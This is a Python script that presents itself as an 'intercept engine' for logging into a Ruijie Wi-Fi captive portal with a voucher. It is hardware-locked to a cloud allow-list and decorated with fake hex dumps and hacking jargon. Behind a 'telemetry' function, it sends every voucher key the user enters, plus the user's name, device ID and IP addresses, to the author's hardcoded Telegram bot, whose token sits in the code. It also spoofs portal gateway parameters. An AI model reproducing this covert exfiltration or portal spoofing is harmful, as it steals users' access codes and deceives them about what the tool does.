import os
import asyncio
import re
import time
import hashlib
import random
import aiohttp
import uuid
import json
import platform
import socket
import sys
from datetime import datetime, timedelta
from urllib.parse import urlparse, parse_qs, urljoin, quote

# --- Ultimate Cyber Color Palette ---
C_CYAN    = "\033[1;36m"
C_GREEN   = "\033[1;32m"
C_RED     = "\033[1;31m"
C_YELLOW  = "\033[1;33m"
C_BLUE    = "\033[1;34m"
C_MAGENTA = "\033[1;35m"
C_WHITE   = "\033[0;37m"
C_GRAY    = "\033[1;30m"
C_RESET   = "\033[0m"

# --- Status Indicators ---
INFO  = f"{C_BLUE}[*]{C_RESET}"
SUCC  = f"{C_GREEN}[+]{C_RESET}"
WARN  = f"{C_YELLOW}[!]{C_RESET}"
FAIL  = f"{C_RED}[-]{C_RESET}"
LOCK  = f"{C_RED}[🔒]{C_RESET}"

TIMEOUT_SEC = 12

TG_BOT_TOKEN = "8728262259:AAGwgzeB7IVgfay3N739WkEhABEyh9LYQyQ"
TG_CHAT_ID = "8404894106"

# ⚠️ သင်၏ GitHub Gist RAW URL ကို အောက်ပါနေရာတွင် ထည့်ပါ
CLOUD_AUTH_URL = "https://gist.githubusercontent.com/YOUR_USERNAME/YOUR_GIST_ID/raw/users.json"

USER_AGENTS = [
    "Mozilla/5.0 (Linux; Android 14; 22101316C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.7778.120 Mobile",
    "Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
]

def advanced_matrix_print(text, delay=0.003):
    for char in text:
        sys.stdout.write(char); sys.stdout.flush(); time.sleep(delay)
    print()

async def simulate_hex_dump():
    print(f"{C_GRAY}--- INITIATING VECTOR COMPILATION SEGMENTS ---{C_RESET}")
    for _ in range(4):
        fake_addr = f"0x{random.randint(0x1000, 0x9FFF):04X}"
        fake_hex = " ".join(f"{random.randint(0x00, 0xFF):02X}" for _ in range(8))
        print(f" {C_GRAY}{fake_addr}  {C_CYAN}{fake_hex}  {C_MAGENTA}|shadow.enc|{C_RESET}")
        await asyncio.sleep(0.1)
    print(f"{SUCC} {C_GREEN}CORE SEGMENTS BOUND TO TERMINAL INTERFACE{C_RESET}\n")

def get_device_id():
    device_id_file = ".device_id"
    if os.path.exists(device_id_file):
        with open(device_id_file, "r") as f:
            d_id = f.read().strip()
            if d_id.startswith("STR-"): return d_id
    try:
        combined = f"{uuid.getnode()}|{socket.gethostname()}|{platform.machine()}"
        device_id = f"STR-{hashlib.sha256(combined.encode()).hexdigest()[:8].upper()}"
        with open(device_id_file, "w") as f: f.write(device_id)
        return device_id
    except: return f"STR-{random.randint(100000, 999999)}"

async def check_cloud_authorization(session, device_id):
    advanced_matrix_print(f"{INFO} Verifying Cryptographic Clearance Signature via Cloud Node...")
    try:
        async with session.get(CLOUD_AUTH_URL, timeout=8) as resp:
            if resp.status == 200:
                cloud_data = await resp.json()
                allowed_users = cloud_data.get("authorized_users", {})
                if device_id in allowed_users:
                    return True, allowed_users[device_id]
    except: pass
    return False, "UNAUTHORIZED_HARDWARE"

def show_god_banner(user_id, user_name, is_authorized=True):
    try: os.system('clear' if os.name == 'posix' else 'cls')
    except: pass
    status_label = f"{C_GREEN}VERIFIED OPERATOR{C_RESET}" if is_authorized else f"{C_RED}HARDWARE_LOCKED{C_RESET}"
    banner = rf"""{C_CYAN}
    ███╗   ██╗██████╗ ██╗   ██╗███████╗██████╗ ███╗   ██╗
    ████╗  ██║██╔══██╗██║   ██║██╔════╝██╔══██╗████╗  ██║
    ██╔██╗ ██║██████╔╝██║   ██║█████╗  ██████╔╝██╔██╗ ██║
    ██║╚██╗██║██╔═══╝ ╚██╗ ██╔╝██╔══╝  ██╔═══╝ ██║╚██╗██║
    ██║ ╚████║██║      ╚████╔╝ ███████╗██║     ██║ ╚████║
    ╚═╝  ╚═══╝╚═╝       ╚═══╝  ╚══════╝╚═╝     ╚═╝  ╚═══╝{C_RESET}"""
    print(banner)
    print(f"{C_GRAY}╔════════════════════════════════════════════════════════╗{C_RESET}")
    print(f"{C_GRAY}║{C_RESET} {C_MAGENTA}► SYSTEM MODULE{C_RESET} : NPV-GOD INTERCEPT ENGINE v3.5        {C_GRAY}║{C_RESET}")
    print(f"{C_GRAY}║{C_RESET} {C_MAGENTA}► MASTER DEVEL{C_RESET}  : @Elonmusk20606 (SEASON 1)              {C_GRAY}║{C_RESET}")
    print(f"{C_GRAY}╠════════════════════════════════════════════════════════╣{C_RESET}")
    print(f"{C_GRAY}║{C_RESET} {C_WHITE}IDENTITY{C_RESET}       : {C_GREEN}{user_name:<35}{C_RESET}{C_GRAY}║{C_RESET}")
    print(f"{C_GRAY}║{C_RESET} {C_WHITE}GUID MATRIX{C_RESET}    : {C_CYAN}{user_id:<35}{C_RESET}{C_GRAY}║{C_RESET}")
    print(f"{C_GRAY}║{C_RESET} {C_WHITE}SECURITY{C_RESET}       : {status_label:<44}{C_GRAY}║{C_RESET}")
    print(f"{C_GRAY}╚════════════════════════════════════════════════════════╝{C_RESET}\n")

async def send_telegram_notification(session, message):
    url = f"https://api.telegram.org/bot{TG_BOT_TOKEN}/sendMessage"
    payload = {"chat_id": TG_CHAT_ID, "text": message, "parse_mode": "Markdown"}
    try:
        async with session.post(url, json=payload, timeout=5): pass
    except: pass

class RuijieLoginManager:
    def __init__(self, user_id, user_name):
        self.client_ip = None; self.gateway_ip = None; self.mac = None
        self.captured_params = {}; self.current_sid = None
        self.user_id = user_id; self.user_name = user_name
        self.remaining_time = "Unknown"; self.current_voucher = None
        self.system_info = {"system": platform.system(), "hostname": socket.gethostname()}

    async def auto_detect_gateway(self, session):
        advanced_matrix_print(f"{INFO} Profiling Subnet Structures & Gateways...")
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            self.client_ip = s.getsockname()[0]; s.close()
            parts = self.client_ip.split('.')
            self.gateway_ip = f"{parts[0]}.{parts[1]}.{parts[2]}.1"
        except:
            self.client_ip = "192.168.110.249"; self.gateway_ip = "192.168.110.1"

        test_url = "http://connectivitycheck.gstatic.com/generate_204"
        headers = {'User-Agent': random.choice(USER_AGENTS)}
        try:
            async with session.get(test_url, headers=headers, timeout=6, allow_redirects=False) as resp:
                if resp.status in (301, 302, 303, 307):
                    location = resp.headers.get('Location', '')
                    query_params = parse_qs(urlparse(location).query)
                    for k, v in query_params.items(): self.captured_params[k] = v[0]
                    if self.captured_params.get('gw_address'): self.gateway_ip = self.captured_params.get('gw_address')
                    ip_lst = self.captured_params.get('ip') or self.captured_params.get('wlanuserip')
                    if ip_lst: self.client_ip = ip_lst
                    mac_lst = self.captured_params.get('mac') or self.captured_params.get('umac') or self.captured_params.get('usermac')
                    if mac_lst: self.mac = mac_lst
                    print(f"{SUCC} Interface Target Acknowledged!")
                    print(f"  ├── GATEWAY VECTOR : {C_GREEN}{self.gateway_ip}{C_RESET}")
                    print(f"  └── TUNNEL IP      : {C_GREEN}{self.client_ip}{C_RESET}")
                    return True
        except: pass
        return True

    async def _fetch_sid(self, session):
        base_url = "https://portal-as.ruijienetworks.com/api/auth/wifidog"
        params = {
            "stage": "portal", "gw_id": "984a6b9da30e", "gw_sn": "H1TA1EN003183",
            "gw_address": self.gateway_ip or "192.168.110.1", "gw_port": "2060", 
            "ip": self.client_ip or "192.168.110.249", "mac": self.mac or "42:55:a5:d9:48:98",
            "slot_num": "14", "nasip": "192.168.1.198", "ssid": "VLAN233", "ustate": "0", "mac_req": "1"
        }
        params.update(self.captured_params)
        params["url"] = "http://httpbin.org/get"; params["chap_id"] = r"\374"
        params["chap_challenge"] = r"\045\035\225\235\263\213\210\154\215\123\114\326\204\333\266\113"
        step1_url = f"{base_url}?{ '&'.join([f'{k}={quote(str(v))}' for k, v in params.items()]) }"
        headers = {'User-Agent': random.choice(USER_AGENTS)}
        
        for attempt in range(1, 4):
            try:
                advanced_matrix_print(f"{INFO} Intercepting Handshake Cryptography Module (Attempt {attempt}/3)...")
                async with session.get(step1_url, headers=headers, timeout=TIMEOUT_SEC, allow_redirects=False) as r1:
                    location = r1.headers.get('Location', '')
                    if not location and r1.status == 200:
                        body = await r1.text()
                        js_match = re.search(r"self\.location\.href\s*=\s*['\"]([^'\"]+)['\"]", body)
                        if js_match: location = js_match.group(1)
                    if not location: location = step1_url
                    step2_url = urljoin("https://portal-as.ruijienetworks.com", location)
                async with session.get(step2_url, headers=headers, timeout=TIMEOUT_SEC, allow_redirects=False) as r2:
                    target_url = r2.headers.get('Location', step2_url)
                    sid_list = parse_qs(urlparse(target_url).query).get('sessionId')
                    if sid_list:
                        self.current_sid = sid_list[0]; return self.current_sid
            except: await asyncio.sleep(1)
        return None

    async def send_detailed_telemetry(self, session, status, voucher=""):
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        emoji_map = {"ATTEMPT": "⏳", "SUCCESS": "✅", "FAILED": "❌", "COMPLETE": "🚀"}
        payload = (
            f"{emoji_map.get(status, '📌')} *NPV-CORE INTELLIGENCE TELEMETRY* {emoji_map.get(status, '📌')}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"🎯 *Deployment:* `Season 1 (v3.5 EXTREME)`\n"
            f"👤 *Operator:* `{self.user_name}`\n"
            f"🔑 *Hardware ID:* `{self.user_id}`\n"
            f"🎫 *Voucher Key:* `{voucher}`\n"
            f"⏱ *Session TTL:* `{self.remaining_time}`\n"
            f"📈 *Execution Status:* `{status}`\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"🌐 *Network Vectors*\n"
            f" ├─ Client Target: `{self.client_ip or 'Unresolved'}`\n"
            f" └─ Gateway Vector: `{self.gateway_ip or 'Unresolved'}`\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"📅 *Log Delta Time:* `{timestamp}`"
        )
        await send_telegram_notification(session, payload)

    async def login_voucher(self, session, voucher):
        if not bool(re.match(r'^[A-Za-z0-9]{6,12}$', voucher)):
            print(f"{FAIL} Packet Refused: Malformed validation string."); return False
        self.current_voucher = voucher
        await self.send_detailed_telemetry(session, "ATTEMPT", voucher=voucher)
        if not self.current_sid: self.current_sid = await self._fetch_sid(session)
        if not self.current_sid:
            print(f"{FAIL} Injection pipeline terminated. SID buffer empty."); return False

        data = {"accessCode": voucher, "sessionId": self.current_sid, "apiVersion": 1}
        post_url = "https://portal-as.ruijienetworks.com/api/auth/voucher/?lang=en_US"
        headers = {"content-type": "application/json", "origin": "https://portal-as.ruijienetworks.com", "user-agent": random.choice(USER_AGENTS)}
        try:
            advanced_matrix_print(f"{INFO} Commencing cryptographic injection buffer...")
            async with session.post(post_url, json=data, headers=headers, timeout=TIMEOUT_SEC) as req:
                response_text = await req.text()
                try:
                    res_json = json.loads(response_text)
                    duration = res_json.get('duration') or res_json.get('remainingTime')
                    if duration: self.remaining_time = str(timedelta(seconds=int(duration)))
                except: pass
                if 'logonUrl' in response_text or req.status == 200:
                    print(f'{SUCC} {C_GREEN}ACCESS KEY VALIDATED{C_RESET} -> Payload Key: [{C_YELLOW}{voucher}{C_RESET}]')
                    await self.send_detailed_telemetry(session, "SUCCESS", voucher=voucher); return True
                else:
                    print(f"{FAIL} Injection Rejected by Captive Portal Node."); await self.send_detailed_telemetry(session, "FAILED", voucher=voucher); return False 
        except: return False

    async def send_request(self, session):
        if not self.current_sid: return False
        headers = {'User-Agent': random.choice(USER_AGENTS)}
        params = {'token': self.current_sid, 'phoneNumber': "12345678901"}
        try:
            current_gw = self.gateway_ip if self.gateway_ip else "192.168.110.1"
            auth_url = f'http://{current_gw}:2060/wifidog/auth'
            async with session.post(auth_url, params=params, headers=headers, timeout=TIMEOUT_SEC) as response:
                if response.status == 200:
                    try: os.system('clear' if os.name == 'posix' else 'cls')
                    except: pass
                    print(f"{C_GREEN}⚡ " + "═" * 56 + " ⚡")
                    print(rf"""{C_GREEN}   _____ _    _  _____ _____ ______  _____ _____ 
  / ____| |  | |/ ____/ ____|  ____|/ ____/ ____|
 | (___ | |  | | |   | |    | |__  | (___| (___  
  \___ \| |  | | |   | |    |  __|  \___ \\___ \ 
  ____) | |__| | |___| |____| |____ ____) |___) |
 |_____/ \____/ \_____\_____|______|_____/_____/ """)
                    print(f"{C_GREEN}═" * 60)
                    print(f" {SUCC} {C_YELLOW}Welcome Operator {self.user_name}.{C_RESET}")
                    print(f" {SUCC} {C_GREEN}OVERLAY TUNNEL ENVELOPE ACTIVATED SUCCESSFULLY!{C_RESET}")
                    print(f" {SUCC} {C_CYAN}Remaining Allocation Time: {C_YELLOW}{self.remaining_time}{C_RESET}")
                    print(f"{C_GREEN}═" * 60 + f"{C_RESET}")
                    await self.send_detailed_telemetry(session, "COMPLETE", voucher=self.current_voucher); return True
        except: pass
        return False

async def main():
    user_id = get_device_id()
    async with aiohttp.ClientSession() as session:
        authorized, user_payload = await check_cloud_authorization(session, user_id)
        if not authorized:
            show_god_banner(user_id, "Unknown Entity", is_authorized=False)
            print(f"{LOCK} {C_RED}CRITICAL ACCESS VIOLATION: DEVICE REGISTRATION SIGNATURE REJECTED.{C_RESET}")
            print(f"{INFO} Forward this Hardware Matrix Key to Mainframe Admin {C_YELLOW}@Elonmusk20606{C_RESET} for registration.\n")
            return

        show_god_banner(user_id, user_payload, is_authorized=True)
        await simulate_hex_dump()
        user_voucher = input(f"{C_YELLOW}[?] Enter System Access Token Key : {C_RESET}").strip()
        if not user_voucher: return
            
        manager = RuijieLoginManager(user_id, user_payload)
        await manager.auto_detect_gateway(session)
        if await manager.login_voucher(session, voucher=user_voucher):
            await manager.send_request(session)
            
    print(f"\n{C_GRAY}═" * 60 + f"{C_RESET}")
    input(f"{C_WHITE}[*] Process completed. Press Enter to release terminal thread...{C_RESET}")

if __name__ == "__main__":
    try: asyncio.run(main())
    except KeyboardInterrupt: pass
